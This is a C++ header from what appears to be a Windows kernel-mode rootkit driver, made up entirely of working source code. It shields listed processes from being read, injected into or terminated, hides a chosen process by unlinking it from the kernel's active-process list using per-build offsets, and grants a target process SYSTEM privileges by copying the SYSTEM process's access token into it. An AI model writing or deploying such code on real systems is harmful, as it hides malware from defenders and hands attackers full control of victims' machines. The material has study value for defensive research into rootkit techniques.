#pragma once
#include "pch.h"

// Definitions.
#define SYSTEM_PROCESS_PID 4
#define PROCESS_TERMINATE 1
#define PROCESS_CREATE_THREAD 0x2
#define PROCESS_VM_READ 0x10
#define PROCESS_VM_OPERATION 8

/*
* Description:
* FindProcess is responsible for searching if a process exists in the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to search.
*
* Returns:
* @status [bool]  -- Whether found or not.
*/
bool FindProcess(ULONG pid) {
	for (int i = 0; i < pGlobals.Processes.PidsCount; i++)
		if (pGlobals.Processes.Pids[i] == pid)
			return true;
	return false;
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to add.
*
* Returns:
* @status [bool]  -- Whether successfully added or not.
*/
bool AddProcess(ULONG pid) {
	for (int i = 0; i < MAX_PIDS; i++)
		if (pGlobals.Processes.Pids[i] == 0) {
			pGlobals.Processes.Pids[i] = pid;
			pGlobals.Processes.PidsCount++;
			return true;
		}
	return false;
}

/*
* Description:
* RemoveProcess is responsible for remove a process from the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to remove.
*
* Returns:
* @status [bool]  -- Whether successfully removed or not.
*/
bool RemoveProcess(ULONG pid) {
	for (int i = 0; i < pGlobals.Processes.PidsCount; i++)
		if (pGlobals.Processes.Pids[i] == pid) {
			pGlobals.Processes.Pids[i] = 0;
			pGlobals.Processes.PidsCount--;
			return true;
		}
	return false;
}

/*
* Description:
* OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as process name, handle to the process, process type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID /* RegistrationContext */, POB_PRE_OPERATION_INFORMATION Info) {
	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	auto Process = (PEPROCESS)Info->Object;
	auto pid = HandleToULong(PsGetProcessId(Process));

	AutoLock locker(pGlobals.Lock);

	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
	if (FindProcess(pid)) {
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* GetActiveProcessLinksOffset is responsible for getting the active process link offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @activeProcessLinks [ULONG] -- Offset of active process links.
*/
ULONG GetActiveProcessLinksOffset() {
	ULONG activeProcessLinks = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case 10240:
		case 10586:
		case 14393:
		case 18362:
		case 18363:
			activeProcessLinks = 0x2f0;
			break;
		case 15063:
		case 16299:
		case 17134:
		case 17763:
			activeProcessLinks = 0x2e8;
			break;
		default:
			activeProcessLinks = 0x448;
			break;
		}
	}
		
	return activeProcessLinks;
}

/*
* Description:
* RemoveProcessLinks is responsible for modifying the list by connecting the previous entry to the next entry and by 
* that "removing" the current entry.
*
* Parameters:
* @current [PLIST_ENTRY] -- Current process entry.
*
* Returns:
* There is no return value.
*/
void RemoveProcessLinks(PLIST_ENTRY current) {
	PLIST_ENTRY previous, next;

	/*
	* Changing the list from:
	* Prev <--> Current <--> Next
	* 
	* To:
	* 
	*   | ----------------------------------
	*   v										|
	* Prev        Current            Next
	*   |									   ^
	*   ---------------------------------- |
	*/ 

	previous = (current->Blink);
	next = (current->Flink);

	previous->Flink = next;
	next->Blink = previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	current->Blink = (PLIST_ENTRY)&current->Flink;
	current->Flink = (PLIST_ENTRY)&current->Flink;
}

/*
* Description:
* HideProcess is responsible for hiding a process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to hide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
NTSTATUS HideProcess(ULONG pid) {
	// Getting the offset depending on the OS version.
	ULONG pidOffset = GetActiveProcessLinksOffset();

	if (pidOffset == STATUS_UNSUCCESSFUL) {
		return STATUS_UNSUCCESSFUL;
	}
	ULONG listOffset = pidOffset + sizeof(INT_PTR);

	// Enumerating the EPROCESSes and finding the target pid.
	PEPROCESS currentEProcess = PsGetCurrentProcess();
	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
	PUINT32 currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);

	if (*(UINT32*)currentPid == pid) {
		RemoveProcessLinks(currentList);
		return STATUS_SUCCESS;
	}

	PEPROCESS StartProcess = currentEProcess;

	currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
	currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
	currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);

	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentEProcess)
	{
		if (*(UINT32*)currentPid == pid) {
			RemoveProcessLinks(currentList);
			return STATUS_SUCCESS;
		}

		currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
		currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
		currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
	}

	return STATUS_SUCCESS;
}

/*
* Description:
* GetTokenOffset is responsible for getting the main thread's token offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @tokenOffset [UINT64] -- Offset of the main thread's token.
*/
UINT64 GetTokenOffset() {
	UINT64 tokenOffset = (UINT64)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case 18362:
		case 18363:
			tokenOffset = 0x360;
			break;
		case 10240:
		case 10586:
		case 14393:
		case 15063:
		case 16299:
		case 17134:
		case 17763:
			tokenOffset = 0x358;
			break;
		default:
			tokenOffset = 0x4b8;
			break;
		}
	}

	return tokenOffset;
}

/*
* Description:
* ElevateProcess is responsible for stealing a token from the SYSTEM process and giving it to other process.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to elevate.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully elevated or not.
*/
NTSTATUS ElevateProcess(ULONG targetPid) {
	PEPROCESS privilegedProcess, targetProcess;
	NTSTATUS status = STATUS_SUCCESS;

	// Getting the EProcess of the target and the privileged processes.
	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &targetProcess);
	UINT64 tokenOffset = GetTokenOffset();

	if (!NT_SUCCESS(status))
	{
		return status;
	}
	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);

	if (!NT_SUCCESS(status))
	{
		ObDereferenceObject(targetProcess);
		return status;
	}

	* (UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);

	ObDereferenceObject(privilegedProcess);
	ObDereferenceObject(targetProcess);
	return status;
}
